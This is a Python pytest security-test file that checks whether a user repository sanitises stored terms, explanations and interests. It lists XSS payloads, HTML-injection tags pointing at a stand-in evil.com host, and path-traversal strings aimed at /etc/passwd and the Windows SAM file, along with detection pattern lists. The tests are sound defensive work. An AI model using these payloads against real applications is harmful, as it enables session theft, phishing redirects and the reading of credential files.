import pytest
from unittest.mock import AsyncMock, patch, MagicMock
from app.db.user_repository import add_term_to_history, save_daily_concept
from app.models.user_model import UserInDB


class TestXSSAndInjectionAttacks:
    """Test XSS and other injection attacks beyond NoSQL"""
    
    @pytest.mark.asyncio
    async def test_xss_attacks_in_user_data(self):
        """Test XSS payloads in user data fields"""
        print("\n[SECURITY TEST] Testing XSS attacks in user data...")
        
        target_user_id = "507f1f77bcf86cd799439011"
        
        # XSS Attack payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<style>@import'http://evil.com/steal.css';</style>",
            "<meta http-equiv=\"refresh\" content=\"0; url=http://evil.com\">",
            "<body onload=alert('XSS')>",
        ]
        
        with patch('app.db.user_repository.get_user_by_id', new_callable=AsyncMock) as mock_get_user, \
             patch('app.db.user_repository.db') as mock_db:
            
            mock_user = UserInDB(
                id=target_user_id,
                username="test_user",
                email="test@example.com",
                password="hashed_password",
                interests=["programming"]
            )
            mock_get_user.return_value = mock_user
            mock_update = AsyncMock()
            mock_db.__getitem__.return_value.update_one = mock_update
            
            blocked_attacks = 0
            
            print(f"Testing {len(xss_payloads)} XSS attack vectors...")
            
            for i, payload in enumerate(xss_payloads, 1):
                print(f"\nXSS Attack #{i}: {payload[:50]}...")
                
                try:
                    # Test XSS in history terms
                    await add_term_to_history(target_user_id, "category", payload)
                    
                    if mock_update.called:
                        call_args = mock_update.call_args
                        stored_term = call_args[0][1]["$addToSet"][f"history.category"]
                        
                        # Check if dangerous HTML/JS was sanitized
                        dangerous_patterns = ['<script', '<img', 'javascript:', '<svg', '<iframe', 'onload', 'onerror']
                        has_dangerous = any(pattern.lower() in stored_term.lower() for pattern in dangerous_patterns)
                        
                        if not has_dangerous:
                            print(f"   [BLOCKED] XSS payload sanitized")
                            blocked_attacks += 1
                        else:
                            print(f"   [BREACH] Dangerous XSS payload stored: {stored_term}")
                    
                    mock_update.reset_mock()
                    
                except ValueError as e:
                    print(f"   [BLOCKED] XSS blocked at validation: {str(e)}")
                    blocked_attacks += 1
                except Exception as e:
                    print(f"   [ERROR] Unexpected error: {str(e)}")
            
            print(f"\nXSS ASSESSMENT:")
            print(f"   Total XSS attacks tested: {len(xss_payloads)}")
            print(f"   Attacks blocked: {blocked_attacks}")
            print(f"   Success rate: {(blocked_attacks/len(xss_payloads)*100):.1f}%")
            
            if blocked_attacks == len(xss_payloads):
                print("   [SECURE] All XSS attacks blocked")
            else:
                print("   [CRITICAL] XSS vulnerabilities detected!")
            
            # Should block most XSS attacks
            assert blocked_attacks >= len(xss_payloads) * 0.8, f"Too many XSS attacks succeeded: {len(xss_payloads) - blocked_attacks}"

    @pytest.mark.asyncio
    async def test_html_injection_in_explanations(self):
        """Test HTML injection in daily concept explanations"""
        print("\n[SECURITY TEST] Testing HTML injection in explanations...")
        
        target_user_id = "507f1f77bcf86cd799439011"
        
        html_injection_payloads = [
            "<h1>Fake Heading</h1>",
            "<style>body{display:none}</style>",
            "<link rel=stylesheet href=http://evil.com/steal.css>",
            "<base href=http://evil.com/>",
            "<!--#exec cmd=\"/bin/ls\"-->",
            "<object data=\"http://evil.com/malware.swf\">",
            "<embed src=\"http://evil.com/malware.swf\">",
            "<form action=http://evil.com method=post>",
        ]
        
        with patch('app.db.user_repository.get_user_by_id', new_callable=AsyncMock) as mock_get_user, \
             patch('app.db.user_repository.db') as mock_db:
            
            mock_user = UserInDB(
                id=target_user_id,
                username="test_user", 
                email="test@example.com",
                password="hashed_password",
                interests=["programming"]
            )
            mock_get_user.return_value = mock_user
            mock_update = AsyncMock()
            mock_db.__getitem__.return_value.update_one = mock_update
            
            blocked_attacks = 0
            
            for i, payload in enumerate(html_injection_payloads, 1):
                print(f"\nHTML Injection #{i}: {payload[:40]}...")
                
                try:
                    await save_daily_concept(target_user_id, "test", "term", payload)
                    
                    if mock_update.called:
                        call_args = mock_update.call_args
                        stored_explanation = call_args[0][1]["$set"]["daily"]
                        
                        # Extract the explanation from the nested structure
                        explanation_text = ""
                        for date_key in stored_explanation:
                            if isinstance(stored_explanation[date_key], dict):
                                explanation_text = stored_explanation[date_key].get("explanation", "")
                        
                        # Check for dangerous HTML tags
                        dangerous_tags = ['<script', '<style', '<link', '<base', '<object', '<embed', '<form']
                        has_dangerous = any(tag.lower() in explanation_text.lower() for tag in dangerous_tags)
                        
                        if not has_dangerous:
                            print(f"   [BLOCKED] HTML injection sanitized")
                            blocked_attacks += 1
                        else:
                            print(f"   [BREACH] Dangerous HTML stored: {explanation_text[:50]}...")
                    
                    mock_update.reset_mock()
                    
                except ValueError as e:
                    print(f"   [BLOCKED] HTML injection blocked: {str(e)}")
                    blocked_attacks += 1
                except Exception as e:
                    print(f"   [ERROR] Unexpected error: {str(e)}")
            
            print(f"\nHTML Injection attacks blocked: {blocked_attacks}/{len(html_injection_payloads)}")
            
            # Should block HTML injection
            assert blocked_attacks >= len(html_injection_payloads) * 0.7, "HTML injection vulnerabilities detected!"

    @pytest.mark.asyncio
    async def test_path_traversal_attacks(self):
        """Test path traversal attacks in user inputs"""
        print("\n[SECURITY TEST] Testing path traversal attacks...")
        
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc//passwd",
            "/var/log/auth.log",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
            "\\\\server\\share\\file.txt",
        ]
        
        # Mock user exists for the test
        target_user_id = "507f1f77bcf86cd799439011"
        mock_user = UserInDB(
            id=target_user_id,
            username="test_user",
            email="test@example.com",
            password="hashed_password",
            interests=["programming"]
        )
        
        with patch('app.db.user_repository.get_user_by_id', new_callable=AsyncMock) as mock_get_user, \
             patch('app.db.user_repository.db') as mock_db:
            
            mock_get_user.return_value = mock_user
            mock_update = AsyncMock()
            mock_db.__getitem__.return_value.update_one = mock_update
            
            from app.db.user_repository import add_interest
            
            blocked_attacks = 0
            
            for i, payload in enumerate(path_traversal_payloads, 1):
                print(f"\nPath Traversal #{i}: {payload}")
                
                try:
                    await add_interest(target_user_id, payload)
                    
                    # If we get here, check what was stored
                    if mock_update.called:
                        call_args = mock_update.call_args
                        stored_interest = call_args[0][1]["$addToSet"]["interests"]
                        
                        # Check if path traversal patterns were sanitized
                        dangerous_patterns = ['../', '..\\', '%2e%2e', 'etc/passwd', 'system32', 'file://']
                        has_dangerous = any(pattern.lower() in stored_interest.lower() for pattern in dangerous_patterns)
                        
                        if not has_dangerous:
                            print(f"   [BLOCKED] Path traversal sanitized to: '{stored_interest}'")
                            blocked_attacks += 1
                        else:
                            print(f"   [POTENTIAL ISSUE] Dangerous path stored: {stored_interest}")
                    
                    mock_update.reset_mock()
                    
                except ValueError as e:
                    if "Invalid" in str(e) or "Input" in str(e) or "too long" in str(e):
                        print(f"   [BLOCKED] Path traversal blocked: {str(e)}")
                        blocked_attacks += 1
                    else:
                        print(f"   [ERROR] Unexpected error: {str(e)}")
                except Exception as e:
                    print(f"   [BLOCKED] Path traversal caused error: {str(e)}")
                    blocked_attacks += 1
            
            print(f"\nPath traversal attacks blocked: {blocked_attacks}/{len(path_traversal_payloads)}")
            
            # Most path traversal should be blocked or sanitized
            assert blocked_attacks >= len(path_traversal_payloads) * 0.6, "Path traversal vulnerabilities detected!"

if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])